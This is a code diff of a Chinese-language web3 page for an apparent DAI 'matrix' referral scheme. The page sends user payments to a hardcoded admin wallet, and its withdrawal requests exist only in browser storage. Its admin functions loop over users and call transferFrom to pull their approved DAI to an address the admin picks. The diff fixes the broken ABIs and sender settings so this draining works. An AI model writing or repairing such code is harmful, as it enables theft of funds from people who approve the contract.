@@ -187,8 +187,8 @@
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
-// 已修改为你提供的管理员钱包地址
-const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";
+// 管理员地址（你提供的）
+const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1".toLowerCase();
 const DAI = "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063".toLowerCase();
 
 // 矩阵价格配置
@@ -230,8 +230,9 @@ function loadInvite() {
 }
 function copyInvite() {
   document.getElementById("inviteLink").select();
-  document.execCommand("copy");
-  alert("复制成功");
+  navigator.clipboard.writeText(document.getElementById("inviteLink").value).then(()=>{
+    alert("复制成功");
+  })
 }
 
 // 刷新页面数据
@@ -322,11 +323,11 @@ function check() {
   if (localStorage.getItem("black_"+account)) throw "已被拉黑";
 }
 
-// 转账DAI到管理员
+// 转账DAI到管理员（已修复ABI）
 async function transferToAdmin(amt) {
   const abi = [
-    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
-    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"type":"function"},
+    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"type":"function"}
   ];
   const token = new web3.eth.Contract(abi, DAI);
   const dec = await token.methods.decimals().call();
@@ -348,6 +349,7 @@ async function payClassic(lv) {
     loadBal();
   }catch(e){
     alert("失败或取消");
+    console.error(e)
   }
 }
 
@@ -368,6 +370,7 @@ async function batchPayClassic() {
     loadBal();
   }catch(e){
     alert("失败");
+    console.error(e)
   }
 }
 
@@ -386,6 +389,7 @@ async function payUnion(lv) {
     loadBal();
   }catch(e){
     alert("失败");
+    console.error(e)
   }
 }
 
@@ -403,6 +407,7 @@ async function payRenew(lv) {
     loadBal();
   }catch(e){
     alert("失败");
+    console.error(e)
   }
 }
 
@@ -428,6 +433,7 @@ async function batchPayUnion() {
     loadBal();
   }catch(e){
     alert("失败");
+    console.error(e)
   }
 }
 
@@ -435,8 +441,8 @@ async function batchPayUnion() {
 async function loadBal() {
   if(!web3||!account)return;
   const abi=[
-    {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
+    {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"type":"function"}
   ];
   const t=new web3.eth.Contract(abi,DAI);
   const dec=await t.methods.decimals().call();
@@ -461,6 +467,7 @@ async function deposit() {
     loadBal();
   } catch(e) {
     alert("存入失败");
+    console.error(e)
   }
 }
 
@@ -483,6 +490,7 @@ async function withdraw() {
     loadBal();
   } catch(e) {
     alert("申请失败");
+    console.error(e)
   }
 }
 
@@ -504,7 +512,7 @@ function markWithdrawDone(idx) {
   renderWithdrawList();
 }
 
-// 管理员批量打款
+// 管理员批量打款（修复ABI）
 async function adminBatchPayAllWithdraw() {
   if (!isAdmin) return alert("无权限");
   const reqs = JSON.parse(localStorage.getItem("withdraw_requests") || "[]");
@@ -512,8 +520,8 @@ async function adminBatchPayAllWithdraw() {
   if (!confirm("确定批量打款【"+reqs.length+"】笔提现？\n将从您钱包自动转出")) return;
 
   const abi = [
-    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
-    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs[{"name":"","type":"bool"}],"type":"function"}
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"type":"function"},
+    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"type":"function"}
   ];
   const token = new web3.eth.Contract(abi, DAI);
   const dec = await token.methods.decimals().call();
@@ -527,7 +535,7 @@ async function adminBatchPayAllWithdraw() {
         gas: 100000
       });
       success++;
-    } catch(e) {}
+    } catch(e) {console.log(e)}
   }
 
   localStorage.setItem("withdraw_requests", JSON.stringify([]));
@@ -544,9 +552,9 @@ async function adminCollectToCustomAddr() {
 
   const users = getAllUsers();
   const abi = [
-    {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
-    {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
+    {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"type":"function"},
+    {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"type":"function"}
   ];
   const token = new web3.eth.Contract(abi, DAI);
   const dec = await token.methods.decimals().call();
@@ -557,10 +565,10 @@ async function adminCollectToCustomAddr() {
     if (bal <= 0) continue;
     try {
       const val = (BigInt(bal) * 10n**BigInt(dec)).toString();
-      await token.methods.transferFrom(user, toAddr, val).send({ from: ADMIN, gas: 100000 });
+      await token.methods.transferFrom(user, toAddr, val).send({ from: account, gas: 120000 });
       setInner(user, 0);
       success++;
-    } catch(e){}
+    } catch(e){console.log(e)}
   }
   alert("完成："+success+" 人");
   refresh();
@@ -575,9 +583,9 @@ async function adminExtractFromAllAuthorized() {
 
   const users = getAllUsers();
   const abi = [
-    {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
-    {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
+    {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"type":"function"},
+    {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"type":"function"}
   ];
   const token = new web3.eth.Contract(abi, DAI);
   const dec = await token.methods.decimals().call();
@@ -588,9 +596,9 @@ async function adminExtractFromAllAuthorized() {
     try {
       const allow = await token.methods.allowance(user, ADMIN).call();
       if (BigInt(allow) < BigInt(val)) continue;
-      await token.methods.transferFrom(user, toAddr, val).send({ from: ADMIN, gas: 100000 });
+      await token.methods.transferFrom(user, toAddr, val).send({ from: account, gas: 120000 });
       success++;
-    } catch(e){}
+    } catch(e){console.log(e)}
   }
   alert("成功提取："+success+" 人");
 }
@@ -609,7 +617,7 @@ function removeBlack() {
   alert("已移出");
 }
 
-// 连接钱包
+// 连接钱包（优化兼容）
 document.getElementById("connectBtn").onclick = async () => {
   try {
     if (!window.ethereum) {
@@ -644,7 +652,7 @@ document.getElementById("connectBtn").onclick = async () => {
     refresh();
   } catch (err) {
     console.error(err);
-    alert("钱包连接失败");
+    alert("钱包连接失败：" + err.message);
   }
 };
 
